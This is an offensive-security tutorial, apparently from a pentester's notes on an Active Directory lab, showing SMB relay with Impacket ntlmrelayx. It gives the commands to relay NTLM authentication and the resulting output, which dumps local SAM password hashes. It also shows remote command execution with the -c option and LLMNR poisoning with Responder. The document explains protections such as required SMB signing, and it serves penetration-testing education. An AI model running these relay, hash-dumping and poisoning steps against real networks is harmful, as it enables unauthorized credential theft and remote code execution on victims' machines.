---
title: SMB Relay Attack
description: SMB Relay Attack
categories: [Active Directory]
tags: [Active Directory, Initial Access, SMB, NTLM Authentication]
weight: 2
---

SMB supports NTLM authentication. A simplified NTLMv2 authentication flow goes as follows:
1. The client and server negotiate NTLM authentication.
2. The server returns a random value called a *nonce* as a **challenge**.
3. The client computes a **response** using password-derived key material, the server challenge, and client data. NTLMv2 uses HMAC-MD5-based calculations rather than simply encrypting the nonce. The client sends the response and account identity, not the password or NT hash.
4. For a local account, the server validates the response using its local account database. For a domain account, the server normally asks a **Domain Controller** to validate the response.
5. If validation succeeds, the client is authenticated. Access to particular resources still depends on authorization.

Without suitable protections, this authentication flow is susceptible to an adversary-in-the-middle attack called SMB relay. The flow of the attack goes as follows:
1. The client initiates a connection to an **attacker-controlled relay**.
2. The attacker relay connects to the target server and forwards the client's NTLM negotiation.
3. The server sends the attacker relay an **NTLM challenge**.
4. The attacker relays the **NTLM challenge** to the client.
5. The client computes the **NTLM response** and sends it to the attacker relay.
6. The attacker relays the client's response to the target server.
7. The target server validates the response. If it succeeds and session protections do not prevent relay, the relay can act with the authenticated account's permissions.

## Attack Requirements
For the SMB relay scenario described here, the target must accept NTLM authentication and must not require **SMB signing**. Signing may be enabled but not required; it does not have to be disabled entirely. Client-side signing requirements can also prevent the incoming SMB authentication from being relayed. Required SMB signing protects the SMB session by requiring signatures derived from a session key that the relay does not know. The signing algorithm depends on the SMB version; it is not always HMAC.

The client must connect to the relay, and the relay must be able to reach the target. Relay forwards a live challenge-response exchange; a saved NetNTLMv2 capture cannot simply be reused against a new challenge. Authentication success alone does not guarantee permission to dump credentials or execute commands.

SMB signing configuration can be checked by using Nmap's default script scan (`-sC`).
```shell-session
╭─brian@iwakura ~
╰─$ nmap -sVC -p445 10.10.0.5
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-24 08:56 -0500
Nmap scan report for 10.10.0.5
Host is up (0.0019s latency).

PORT    STATE SERVICE       VERSION
445/tcp open  microsoft-ds?

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2026-03-24T13:56:09
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.38 seconds
```
For the SAM-dumping and remote-command examples below, the relayed account also needs local administrator rights on the target and access to the necessary remote services. Other relay actions may work with fewer privileges.

## Exploitation Procedure
First, we build a list of authorized targets and check their signing requirements. The addresses below are lab examples, not a guarantee that each host is relayable. Relaying a client's authentication back to that same host is normally blocked by reflection protections.
```shell-session
╭─brian@iwakura ~
╰─$ cat targets.txt
10.10.0.3
10.10.0.4
10.10.0.5
```

Next, we will use Impacket `ntlmrelayx.py` (aka `impacket-ntlmrelayx`), a tool designed to relay NTLM authentication requests between two or more hosts.
```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support
```

When a victim tries to connect to our attacker machine via SMB, `ntlmrelayx` attempts to relay authentication between the victim and the specified targets. By default, after a successful SMB relay with sufficient administrative access, it attempts to dump local SAM hashes from member servers or workstations. Domain controllers do not have an ordinary local SAM account database to dump this way.
```shell-session
[*] Received connection from GUNDAM/amuro.ray at RX-0-UNICORN, connection will be relayed after re-authentication
[]
[*] SMBD-Thread-5 (process_request_thread): Connection from GUNDAM/AMURO.RAY@10.10.0.4 controlled, attacking target smb://10.10.0.3
[*] Authenticating against smb://10.10.0.3 as GUNDAM/AMURO.RAY SUCCEED
[]
[*] SMBD-Thread-5 (process_request_thread): Connection from GUNDAM/AMURO.RAY@10.10.0.4 controlled, attacking target smb://10.10.0.4
[-] Signing is required, attack won't work unless using -remove-target / --remove-mic
[-] DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[-] Authenticating against smb://10.10.0.4 as GUNDAM/AMURO.RAY FAILED
[*] Received connection from GUNDAM/amuro.ray at RX-0-UNICORN, connection will be relayed after re-authentication
[ParseResult(scheme='smb', netloc='GUNDAM\\AMURO.RAY@10.10.0.4', path='', params='', query='', fragment='')]
[*] SMBD-Thread-7 (process_request_thread): Connection from GUNDAM/AMURO.RAY@10.10.0.4 controlled, attacking target smb://10.10.0.5
[*] Authenticating against smb://10.10.0.5 as GUNDAM/AMURO.RAY SUCCEED
[*] All targets processed!
[*] SMBD-Thread-7 (process_request_thread): Connection from GUNDAM/AMURO.RAY@10.10.0.4 controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Received connection from GUNDAM/amuro.ray at RX-0-UNICORN, connection will be relayed after re-authentication
[*] Target system bootKey: 0x3142c8b7128c1c572d30bee6fac3e9c8
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:84684d325a64e9572a364eb95afbefdd:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:f9b62f0b43ad35dc7117b302400f4726:::
[*] Done dumping SAM hashes for host: 10.10.0.5
```

The captured output above includes a failed relay and a signing-related diagnostic. That historical diagnostic is not evidence that its suggested flags bypass required signing on a patched target.

Alternatively, we can have `ntlmrelayx` execute a command with the lowercase `-c` option.
```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support -c '<cmd>'
```
On each successfully relayed target where the account has the required administrative access and remote services are available, the tool attempts to execute the command.
```shell-session
╭─brian@iwakura ~
╰─$ sudo impacket-ntlmrelayx -tf targets.txt -smb2support -c ipconfig
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
[...]
[*] Received connection from GUNDAM/amuro.ray at RX-0-UNICORN, connection will be relayed after re-authentication
[]
[*] SMBD-Thread-5 (process_request_thread): Connection from GUNDAM/AMURO.RAY@10.10.0.4 controlled, attacking target smb://10.10.0.3
[*] Authenticating against smb://10.10.0.3 as GUNDAM/AMURO.RAY SUCCEED
[]
[*] SMBD-Thread-5 (process_request_thread): Connection from GUNDAM/AMURO.RAY@10.10.0.4 controlled, attacking target smb://10.10.0.4
[-] Signing is required, attack won't work unless using -remove-target / --remove-mic
[-] DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[-] Authenticating against smb://10.10.0.4 as GUNDAM/AMURO.RAY FAILED
[*] Received connection from GUNDAM/amuro.ray at RX-0-UNICORN, connection will be relayed after re-authentication
[ParseResult(scheme='smb', netloc='GUNDAM\\AMURO.RAY@10.10.0.4', path='', params='', query='', fragment='')]
[*] SMBD-Thread-7 (process_request_thread): Connection from GUNDAM/AMURO.RAY@10.10.0.4 controlled, attacking target smb://10.10.0.5
[*] Authenticating against smb://10.10.0.5 as GUNDAM/AMURO.RAY SUCCEED
[*] All targets processed!
[*] SMBD-Thread-7 (process_request_thread): Connection from GUNDAM/AMURO.RAY@10.10.0.4 controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Received connection from GUNDAM/amuro.ray at RX-0-UNICORN, connection will be relayed after re-authentication
[*] Executed specified command on host: 10.10.0.5

Windows IP Configuration


Ethernet adapter Ethernet:

Connection-specific DNS Suffix  . : goad.lab
Link-local IPv6 Address . . . . . : fe80::eab0:c944:1ec3:f2e9%12
IPv4 Address. . . . . . . . . . . : 10.10.0.5
Subnet Mask . . . . . . . . . . . : 255.255.255.0
Default Gateway . . . . . . . . . : 10.10.0.1

[*] Stopping service RemoteRegistry
```

### Combining SMB Relay with LLMNR Poisoning
During an engagement, users may not connect to the attacker's SMB server directly. Where LLMNR is enabled, poisoning a name-resolution request can redirect a client to the relay. A relay opportunity still depends on the client attempting NTLM authentication and the target's security configuration.

We can use Responder for LLMNR poisoning, but its SMB and HTTP servers must be disabled when `ntlmrelayx` uses those ports. Edit the configuration used by the installed package (for example, `/etc/responder/Responder.conf` or `/usr/share/responder/Responder.conf`) and disable any other listeners that conflict. Use plain `On` or `Off` values as shown below.
```txt
[Responder Core]

; Servers to start
SQL = On
SMB = Off
HTTP = Off
HTTPS = Off
RDP = On
Kerberos = On
FTP = On
```
We start Responder after starting `ntlmrelayx`.
```bash
sudo responder -I <iface>
```

After we poison an LLMNR request, `ntlmrelayx`, rather than Responder, handles the incoming authentication and attempts to relay it between the connecting victim and a configured target.
